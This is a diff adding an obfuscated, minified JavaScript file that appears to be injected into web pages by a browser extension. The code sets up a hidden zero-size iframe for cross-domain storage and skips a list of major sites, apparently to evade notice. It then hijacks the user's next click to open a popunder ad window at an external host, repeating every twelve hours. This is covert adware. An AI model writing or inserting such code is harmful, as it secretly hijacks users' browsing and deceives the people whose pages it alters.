@@ -1,0 +1,34 @@
+(function () {
+    function z() { try { xdls.getData("las", function (a) { var q = (new Date).getTime(); if (a && "null" != a && (a = parseInt(a)) && a > q) return; A() }) } catch (a) { } } function A() { xdls.getData("numads", function (a) { if ("null" == a || 2 < a) a = 1, xdls.setData("numads", a); n += a; window.addEventListener("click", w) }) } function w(a) { window.removeEventListener("click", w); window.open(n, "_blank"); a = (new Date).getTime(); xdls.incrementData("numads"); xdls.setData("las", a + 432E5) } var m = function () {
+        function a(a) { return "function" === typeof a } function q() {
+            try {
+                return String(Math.round(999999999 *
+                Math.random()))
+            } catch (c) { }
+        } function m(c, e, l, B, b) {
+            function f() { try { if (document.body) { try { if (document.documentMode) { var b = document.getElementsByTagName("frameset")[0]; b && b.rows && (b.rows += ",0"); b && b.cols && (b.cols += ",0") } } catch (C) { } var a = document.getElementById(g); null === a ? document.body.appendChild(t) : t = a; t.appendChild(d) } else h--, h && setTimeout(f, 200) } catch (C) { } } function k() { try { d.parentNode.removeChild(d), d.detachEvent ? d.detachEvent("onload", p) : d.onload = null } catch (x) { } } function p() {
+                try {
+                    a(e) && e(d), B &&
+                    setTimeout(k, 100)
+                } catch (x) { }
+            } try { var h = 5, d = document.createElement("iframe"); d.style.width = "0px"; d.style.height = "0px"; d.style.display = "none"; d.src = c; b && (d.sandbox = b); l && (d.id = l); d.attachEvent ? d.attachEvent("onload", p) : d.onload = p; var t = document.createElement("div"); t.id = g; f() } catch (x) { }
+        } function r(a, e, h) {
+            var c = function (b, c) { try { c = c || q(), a.contentWindow.postMessage(c + u + b, h || e) } catch (k) { } }; return {
+                getData: function (b, h, k) {
+                    try {
+                        if (a) {
+                            var p = window.addEventListener ? "addEventListener" : "attachEvent", f = window[p],
+                            d = window[window.removeEventListener ? "removeEventListener" : "detachEvent"], l = "attachEvent" === p ? "onmessage" : "message", g = q(), m = "get:::", n = function (b) { try { var a; if (a = -1 < e.indexOf(b.origin)) { var c; a: { try { c = b.data.split(u)[0]; break a } catch (y) { } c = void 0 } a = c === g } if (a) { d(l, n, !1); var k; a: { var f = b.data; try { f = f.split(u)[1]; -1 < f.indexOf("~~~") && (f = f.split("~~~")); k = f; break a } catch (y) { } k = void 0 } h(k) } } catch (y) { } }; f(l, n, !1); b instanceof Array ? (b = b.join("~~~"), m = k ? "getandremovemulti:::" : "getmulti:::") : k && (m = "getandremove:::")
+                        } c(m +
+                        b, g)
+                    } catch (D) { }
+                }, setData: function (b, a, e) { try { c(!0 === e ? "setifnull:::" + b + "***" + a : b + ":::" + a) } catch (p) { } }, incrementData: function (b) { try { c("increment:::" + b) } catch (f) { } }, removeData: function (b) { try { c("remove:::" + b) } catch (f) { } }
+            }
+        } var g = "gsdfcdiv", u = "^^^", h = {}, v = {}, g = "gsdfcdiv", u = "^^^", n = "facebook.com google. yahoo.com costco.com youtube.com twitter.com instagram.com live.com reddit.com bing.com linkedin.com msn.com netflix.com apple.com pinterest.com adobe.com craigslist.org nytimes.com ask.com paypal.com twitch.tv espn.com cnn.com smartwebchoices.com".split(" ");
+        return {
+            getXDLS: function (c, e, g) { for (var l = 0; l < n.length; l++) if (-1 < window.location.host.indexOf(n[l])) return; try { -1 == e.indexOf("//") && (e = "https://" + e); 0 == e.indexOf("//") && (e = "https:" + e); var b = e + (g || "") || void 0, f = "d=" + encodeURIComponent(window.location.protocol + "//" + window.location.host); g = b + "pifp.html?" + ("" + f); v[b] ? a(c) && c(v[b]) : (h[b] = h[b] || [], h[b].push(c), 1 === h[b].length && m(g, function (a) { for (a = v[b] = r(a, b, e) ; h[b].length;) { var c = h[b].pop(); "function" === typeof c && c(a) } })) } catch (k) { console.log(k.message) } },
+            getQueryStringParam: function (a) { try { a = a.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]"); var c = (new RegExp("[\\?&]" + a + "=([^&#]*)")).exec(document.currentScript.src); return null == c ? "" : decodeURIComponent(c[1]) } catch (l) { } }, appendIframe: m, getToken: q, isFunction: a
+        }
+    }(), r = document.currentScript.src, g = decodeURIComponent(m.getQueryStringParam("apid")), g = g.replace(/^https?\:\/\//i, ""), r = r.split("o?")[0].match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i)[0], n = "http://" + g + "/or?por=t&arc="; decodeURIComponent(m.getQueryStringParam("extid"));
+    m.getXDLS(function (a) { xdls = a; z() }, r, "")
+})();
